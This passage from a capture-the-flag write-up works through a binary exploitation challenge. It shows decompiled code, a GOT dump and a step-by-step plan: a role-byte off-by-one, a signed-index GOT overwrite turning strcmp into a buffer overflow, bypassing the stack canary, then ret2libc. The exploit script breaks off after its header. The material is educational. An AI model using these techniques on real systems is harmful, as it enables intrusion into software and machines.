</span></span><span class=line><span class=cl>&lt;===[ Edit Username ]===&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>New username size: 7
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Enter your new username: shark
</span></span><span class=line><span class=cl>[+] User updated successfully!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌───────────────┬────────┐
</span></span><span class=line><span class=cl>│ Control Panel │ 9A0:F3 │
</span></span><span class=line><span class=cl>├───────────────┴────────┤
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>│ Technician:            │
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>│ 1. Configure Engine    │
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>│ 2. Check Engine        │
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>│ Captain:               │
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>│ 3. Set route           │
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>│ 4. View route          │
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>│ 5. Change roles        │
</span></span><span class=line><span class=cl>│                        │
</span></span><span class=line><span class=cl>└────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] Current Role: Crew
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Option [1-5]:
</span></span></code></pre></td></tr></table></div></div><h3 id=static-analysis>Static Analysis</h3><p>The challenge binary had quite a few functions, compared to your standard pwn challenge, and a bunch of functions
were irrelevant for my exploit, so I&rsquo;ll just list most of the functions.</p><ul><li><code>register_user</code>: Allows the user to register a username. The username, username length, and role are stored in a heap chunk,
and a pointer to the chunk is stored in a global variable <code>curr_user</code>. The role is a single byte variable, 1=Technician, 0=Captain, 2=Crew.</li><li><code>edit_user</code>: Allows us to change the username, the program checks the size of the new username is not longer than
the old username, but there is an off-by-one error allowing us to overwrite the role byte, so we can become the captain</li><li><code>change_role</code>: Allows the captain to change his role.</li><li><code>view_route</code>: Allows us to view the route, which is a global variable made up of 4 lots of 2 int64_t values, to represent latitude and longitude.</li><li><code>change_route</code>: A person with the captain role can set a route, which is a global variable made up of 4 lots of 2
int64_t values, to represent latitude and longitude. There was actually an UDA (uninitialised data access) here,
when reading the data from the stack to the global variable, so if the user entered no data, some stack data would
get copied into the global buffer and could be leaked using <code>view_route</code>.</li><li><code>check_engines</code>: A person with the technician role can check the engines, which is a global variable made up of 4
lots of two int64_t values, representing <code>thrust</code> and <code>mix_ratio</code>. This function just checked the values were within
a valid range and would log an error if not. I don&rsquo;t think there was anything challenge relevent here.</li><li><code>configure_engine</code>: A person with the technician role can configure the engines, this is the juicy one that we will
discuss more.</li></ul><h2 id=configure-engine>Configure Engine</h2><p><code>configure_engine()</code> lets a technician select one of the 4 engines, and then supply values for <code>thrust</code> and <code>mix_ratio</code>.
The values are stored in a global variable, in a variable I called <code>engines</code>.</p><p>The code for <code>configure_engine()</code> looked pretty nasty at first.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int64_t</span> <span class=nf>configure_engine</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>fsbase</span>
</span></span><span class=line><span class=cl>    <span class=kt>int64_t</span> <span class=n>rax</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>fsbase</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kt>int16_t</span> <span class=n>var_13</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>var_11</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>var_2c</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>curr_user</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>log_message</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=s>&#34;Only technicians are allowed to …&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>Engine number [0-%d]: &#34;</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=kt>int32_t</span> <span class=n>rax_5</span> <span class=o>=</span> <span class=nf>read_num</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=kt>int64_t</span> <span class=n>var_28</span>
</span></span><span class=line><span class=cl>        <span class=kt>int64_t</span> <span class=n>var_20</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>rax_5</span> <span class=n>s</span><span class=o>&lt;=</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;Engine [%d]: </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>zx</span><span class=p>.</span><span class=nf>q</span><span class=p>(</span><span class=n>rax_5</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\t</span><span class=s>Thrust: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>data_40330e</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>var_28</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\t</span><span class=s>Mixture ratio: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>data_40330e</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>var_20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>getchar</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>Do you want to save the config…&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>data_403347</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=nl>buf</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>var_13</span><span class=p>,</span> <span class=nl>n</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=nl>fp</span><span class=p>:</span> <span class=n>stdin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>var_13</span> <span class=o>+</span> <span class=nf>strcspn</span><span class=p>(</span><span class=o>&amp;</span><span class=n>var_13</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>data_4030a2</span><span class=p>))</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=o>&amp;</span><span class=n>var_13</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>data_40334b</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=kt>int64_t</span> <span class=n>rdx_3</span> <span class=o>=</span> <span class=n>var_20</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>((</span><span class=n>sx</span><span class=p>.</span><span class=nf>q</span><span class=p>(</span><span class=n>rax_5</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=o>&amp;</span><span class=n>engines</span><span class=p>)</span> <span class=o>=</span> <span class=n>var_28</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>((</span><span class=n>sx</span><span class=p>.</span><span class=nf>q</span><span class=p>(</span><span class=n>rax_5</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=o>&amp;</span><span class=n>data_405128</span><span class=p>)</span> <span class=o>=</span> <span class=n>rdx_3</span>
</span></span><span class=line><span class=cl>            <span class=nf>log_message</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Engine configuration updated suc…&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>            <span class=nf>log_message</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Engine configuration cancelled.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kt>int64_t</span> <span class=n>rax_21</span> <span class=o>=</span> <span class=n>rax</span> <span class=o>^</span> <span class=o>*</span><span class=p>(</span><span class=n>fsbase</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>rax_21</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>rax_21</span>
</span></span><span class=line><span class=cl>    <span class=nf>__stack_chk_fail</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>noreturn</span>
</span></span></code></pre></td></tr></table></div></div><p>This just because original code would have used structures for the engines, so recreating those structures
makes the code much more readable.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int64_t</span> <span class=nf>configure_engine</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>fsbase</span>
</span></span><span class=line><span class=cl>    <span class=kt>int64_t</span> <span class=n>rax</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>fsbase</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kt>int16_t</span> <span class=n>confirm</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>var_11</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>var_2c</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>curr_user</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>log_message</span><span class=p>(</span><span class=nl>log_level</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=nl>message</span><span class=p>:</span> <span class=s>&#34;Only technicians are allowed to …&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>Engine number [0-%d]: &#34;</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=kt>int32_t</span> <span class=n>engine_index</span> <span class=o>=</span> <span class=nf>read_num</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>engine</span> <span class=n>engine</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>engine_index</span> <span class=n>s</span><span class=o>&lt;=</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;Engine [%d]: </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>zx</span><span class=p>.</span><span class=nf>q</span><span class=p>(</span><span class=n>engine_index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\t</span><span class=s>Thrust: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>_</span><span class=o>%</span><span class=n>l</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>engine</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\t</span><span class=s>Mixture ratio: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>_</span><span class=o>%</span><span class=n>l</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>engine</span><span class=p>.</span><span class=n>mix_ratio</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>getchar</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>Do you want to save the config…&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=nl>format</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>_</span><span class=o>&gt;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=nl>buf</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>confirm</span><span class=p>,</span> <span class=nl>n</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=nl>fp</span><span class=p>:</span> <span class=n>stdin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>confirm</span> <span class=o>+</span> <span class=nf>strcspn</span><span class=p>(</span><span class=o>&amp;</span><span class=n>confirm</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>_</span><span class=err>\</span><span class=n>n</span><span class=p>))</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=o>&amp;</span><span class=n>confirm</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>y</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=kt>int64_t</span> <span class=n>ratio_1</span> <span class=o>=</span> <span class=n>engine</span><span class=p>.</span><span class=n>mix_ratio</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>((</span><span class=n>sx</span><span class=p>.</span><span class=nf>q</span><span class=p>(</span><span class=n>engine_index</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=o>&amp;</span><span class=n>engines</span><span class=p>)</span> <span class=o>=</span> <span class=n>engine</span><span class=p>.</span><span class=nf>thrust</span>
</span></span><span class=line><span class=cl>            <span class=p>(</span><span class=o>&amp;</span><span class=n>engines</span><span class=p>.</span><span class=n>engine_0</span><span class=p>.</span><span class=n>mix_ratio</span><span class=p>)[</span><span class=n>sx</span><span class=p>.</span><span class=nf>q</span><span class=p>(</span><span class=n>engine_index</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>ratio_1</span>
</span></span><span class=line><span class=cl>            <span class=nf>log_message</span><span class=p>(</span><span class=nl>log_level</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=nl>message</span><span class=p>:</span> <span class=s>&#34;Engine configuration updated suc…&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>            <span class=nf>log_message</span><span class=p>(</span><span class=nl>log_level</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=nl>message</span><span class=p>:</span> <span class=s>&#34;Engine configuration cancelled.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kt>int64_t</span> <span class=n>rax_20</span> <span class=o>=</span> <span class=n>rax</span> <span class=o>^</span> <span class=o>*</span><span class=p>(</span><span class=n>fsbase</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>rax_20</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>rax_20</span>
</span></span><span class=line><span class=cl>    <span class=nf>__stack_chk_fail</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>noreturn</span>
</span></span></code></pre></td></tr></table></div></div><p>The bug here, is that the <code>engine_index</code> has a signed comparison, so by entering a negative number it will pass the
check and allow us to write into memory at offsets above the <code>engines</code> variable in memory. Since this is in
global memory, the Global Offset Table (GOT) is located here. So we have a GOT overwrite primitive via OOB write.
An additional constraint of this is that two values must be written, so this forced an overwrite for 2 adjacent GOT entries.
Most times the impact of this could be reduced by just overwriting the other entry with a <code>ret</code> gadget.</p><p>Now, we need to find a candidate to be overwritten, that will create a useful primitive for us. Since we have
no LIBC leak, and <code>system</code> or other code-exec functions have not been used, we can only work with what already
exists in the program.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GOT protection: Partial RELRO | GOT functions: 20
</span></span><span class=line><span class=cl>[0x405018] free@GLIBC_2.2.5 -&gt; 0x401030 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405020] strncpy@GLIBC_2.2.5 -&gt; 0x401040 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405028] puts@GLIBC_2.2.5 -&gt; 0x7f64df83ded0 (puts) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405030] fread@GLIBC_2.2.5 -&gt; 0x7f64df83cbb0 (fread) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405038] fclose@GLIBC_2.2.5 -&gt; 0x7f64df83bcf0 (fclose@@GLIBC_2.2.5) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405040] strlen@GLIBC_2.2.5 -&gt; 0x401080 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405048] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401090 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405050] printf@GLIBC_2.2.5 -&gt; 0x7f64df81d770 (printf) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405058] memset@GLIBC_2.2.5 -&gt; 0x7f64df95e100 (__memset_avx2_unaligned_erms) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405060] strcspn@GLIBC_2.2.5 -&gt; 0x4010c0 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405068] fgets@GLIBC_2.2.5 -&gt; 0x7f64df83c400 (fgets) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405070] strcmp@GLIBC_2.2.5 -&gt; 0x4010e0 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405078] getchar@GLIBC_2.2.5 -&gt; 0x4010f0 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405080] fprintf@GLIBC_2.2.5 -&gt; 0x401100 ◂— endbr64
</span></span><span class=line><span class=cl>[0x405088] malloc@GLIBC_2.2.5 -&gt; 0x7f64df862120 (malloc) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405090] setvbuf@GLIBC_2.2.5 -&gt; 0x7f64df83e670 (setvbuf) ◂— endbr64
</span></span><span class=line><span class=cl>[0x405098] fopen@GLIBC_2.2.5 -&gt; 0x7f64df83c6b0 (fopen@@GLIBC_2.2.5) ◂— endbr64
</span></span><span class=line><span class=cl>[0x4050a0] atoi@GLIBC_2.2.5 -&gt; 0x401140 ◂— endbr64
</span></span><span class=line><span class=cl>[0x4050a8] __isoc99_scanf@GLIBC_2.7 -&gt; 0x401150 ◂— endbr64
</span></span><span class=line><span class=cl>[0x4050b0] exit@GLIBC_2.2.5 -&gt; 0x401160 ◂— endbr64
</span></span></code></pre></td></tr></table></div></div><h2 id=exploitation>Exploitation</h2><p>After quite a while looking the functions, what arguments are supplied, whether they&rsquo;re used in places that would
break the program before I could exploit it. This was quite tricky, as the data out (<code>fgets</code>, <code>scanf</code> etc) functions
all have quite complex function arguments that couldn&rsquo;t be fulfilled in other functions, such as <code>fgets</code> needing a
pointer to <code>stdin</code> as the third argument. I found a candidate eventually. Still in the <code>configure_engine</code> function, there
is a <code>strcmp()</code> on the <code>confirm</code> local variable, with the comparison character of <code>y</code>. When overwritten with the program
defined function <code>read_input</code>, which takes arguments <code>char *buf, int size</code>, this essentially forces a buffer
overflow in the <code>confirm</code> variable, which is 2 bytes long, with the <code>y</code> character which essentially becomes the size
79, neat right!</p><p>So <code>strcmp(&amp;confirm, &amp;y)</code> becomes <code>read_input(confirm, 79)</code>, which is a large buffer overflow.</p><p>Plan of attack seems&mldr; simples!</p><ol><li>Create a user, fill the buffer to the largest allowed size.</li><li>Edit the user, exploit the off-by-one to overwrite the <code>role</code> variable with 0 and become the captain role.</li><li>Change role to <code>technician</code> using the <code>change_role</code> function.</li><li>Configure the engines, and overwrite the GOT <code>strcmp</code> with <code>read_input</code> to get a buffer overflow.</li><li>Use the buffer overflow to do a ret2libc</li><li>Profit</li></ol><div class="details admonition note"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>Turns out this wasn&rsquo;t actually the intended method. The player was supposed to use the UDA to leak LIBC, and then
overwrite <code>atoi</code> with <code>system</code>, then just supply <code>sh</code> to input that gets passed to atoi. My way is more fun tho :D</div></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/control/ss0.png data-srcset="./images/control/ss0.png, ./images/control/ss0.png 1.5x, ./images/control/ss0.png 2x" data-sizes=auto alt=./images/control/ss0.png title="Attempt 1 Exploit"></p><p>Hmm, so that didn&rsquo;t work - we can see what&rsquo;s happened. The <code>memset()</code> in the <code>read_input</code> function has caused
the exploit to crash&mldr; Well - who even needs initialised memory buffers anyway! Let&rsquo;s just overwrite the GOT
entry for <code>memset</code> with a <code>ret</code> gadget, and the adjacent <code>printf</code> with <code>puts.plt</code>.</p><p>Close, but no cigar&mldr;</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/control/ss1.png data-srcset="./images/control/ss1.png, ./images/control/ss1.png 1.5x, ./images/control/ss1.png 2x" data-sizes=auto alt=./images/control/ss1.png title="Attempt 2 Exploit"></p><p>Since the program has a stack canary mitigation, it is calling <code>__stack_chk_fail</code> and aborting before we can hijack execution.
Well - let&rsquo;s just overwrite the GOT entry for <code>__stack_chk_fail</code> with a <code>ret</code> gadget, and the adjacent <code>strlen()</code> with a ret too.</p><p>This time it worked! We leaked libc using a ret2plt rop chain, and returned to the <code>configure_engine</code> function for
a second round.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/control/ss2.png data-srcset="./images/control/ss2.png, ./images/control/ss2.png 1.5x, ./images/control/ss2.png 2x" data-sizes=auto alt=./images/control/ss2.png title="Attempt 3 Exploit"></p><p>With LIBC, exploitation is trivial. Exploit code below.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span><span class=lnt>97
</span><span class=lnt>98
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>IP</span><span class=p>,</span> <span class=n>PORT</span> <span class=o>=</span> <span class=s2>&#34;161.35.168.118&#34;</span> <span class=p>,</span><span class=mi>31978</span>
